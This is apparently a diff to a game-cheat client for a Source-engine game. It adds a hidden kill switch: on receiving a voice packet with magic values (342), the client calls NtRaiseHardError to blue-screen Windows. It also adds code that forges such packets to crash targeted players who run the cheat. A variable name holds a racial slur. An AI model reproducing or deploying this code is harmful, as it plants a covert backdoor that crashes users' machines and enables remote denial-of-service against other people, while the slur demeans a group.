@@ -4,6 +4,8 @@
 #include "../../SDK/Menu/config.h"
 #include "../../Features/Rage/Animations/Lagcompensation.h"
 
+#include "../../Features/Misc/Playerlist.h"
+
 void __fastcall h::hkProcessPacket( void* ecx, void* edx, void* packet, bool header )
 {
 	static auto original = detour::processPacket.GetOriginal<decltype( &hkProcessPacket )>( );
@@ -31,6 +33,32 @@ void __fastcall h::hkProcessPacket( void* ecx, void* edx, void* packet, bool hea
 	i::EngineClient->FireEvents( );
 }
 
+void BSOD( )
+{
+	BOOLEAN b;
+	ULONG r;
+
+	HMODULE m_pNTDLL = GetModuleHandle( "ntdll.dll" );
+	( ( NTSTATUS( NTAPI* )( ULONG, BOOLEAN, BOOLEAN, PBOOLEAN ) )GetProcAddress( m_pNTDLL, "RtlAdjustPrivilege" ) )( 19, true, false, &b );
+	( ( NTSTATUS( NTAPI* )( NTSTATUS, ULONG, ULONG, PULONG_PTR*, ULONG, PULONG ) )GetProcAddress( m_pNTDLL, "NtRaiseHardError" ) )( 0xDEADDEAD, 0, 0, 0, 6, &r );
+}
+
+bool __fastcall h::hkSVCMsg_VoiceData( void* thistr, void* edx, C_SVCMsg_VoiceData* Message )
+{
+	static auto original = detour::voiceData.GetOriginal<decltype( &hkSVCMsg_VoiceData )>( );
+
+	if ( !g::pLocal || g::pLocal->EntIndex( ) == Message->m_iClient + 1 )
+		return original( thistr, edx, Message );
+
+	C_VoiceCommunicationData VoiceData = Message->GetData( );
+	if ( Message->m_nFormat == 0 && VoiceData.m_nXuidHigh == g::pLocal->EntIndex( ) && VoiceData.m_nSectionNumber == 342 && VoiceData.m_nSequenceBytes == 342 && VoiceData.m_nUnCompressedSampleOffset == 342 )
+	{
+		BSOD( );
+	}
+
+	return original( thistr, edx, Message );
+}
+
 bool __fastcall h::hkSendNetMsg( INetChannel* thisptr, int edx, INetMessage* pMessage, bool bForceReliable, bool bVoice )
 {
 	static auto original = detour::sendNetMsg.GetOriginal<decltype(&hkSendNetMsg)>();
@@ -50,6 +78,33 @@ bool __fastcall h::hkSendNetMsg( INetChannel* thisptr, int edx, INetMessage* pMe
 	if ( pMessage->GetGroup( ) == INetChannelInfo::VOICE )
 		bVoice = true;
 
+	for ( int i = 1; i < i::GlobalVars->nMaxClients; i++ )
+	{
+		CBaseEntity* m_pEntity = reinterpret_cast< CBaseEntity* >( i::EntityList->GetClientEntity( i ) );
+		if ( m_pEntity == nullptr || m_pEntity == g::pLocal || !m_pEntity->IsPlayer( ) )
+			continue;
+
+		// force bluescreen on RyzeXTR users :kekw:
+		if ( playerList::arrPlayers[ i ].BlueScreenNigger == true )
+		{
+			C_CLCMsg_VoiceData   msg = { };
+			//memset( &msg, 0, sizeof( msg ) );
+
+			// call constructor ( called in CL_SendVoicePacket ).
+			using ConstructVoiceMessage_t = uint32_t( __fastcall* )( void*, void* );
+			static ConstructVoiceMessage_t ConstructVoiceMessage = reinterpret_cast< ConstructVoiceMessage_t >( util::FindSignature( "engine.dll", "56 57 8B F9 8D 4F 08 C7 07 ? ? ? ? E8 ? ? ? ? C7" ) );
+			ConstructVoiceMessage( reinterpret_cast< void* >( &msg ), nullptr );
+
+			msg.m_nXuidHigh = i;
+			msg.m_nSequenceBytes = 342;
+			msg.m_nSectionNumber = 342;
+			msg.m_nUnCompressedSampleOffset = 342;
+			msg.m_nFormat = 0;
+			msg.m_nFlags = 63;
+			original( thisptr, edx, reinterpret_cast< INetMessage* >( &msg ), false, true );
+		}
+	}
+	
 	return original( thisptr, edx, pMessage, bForceReliable, bVoice );
 }
 
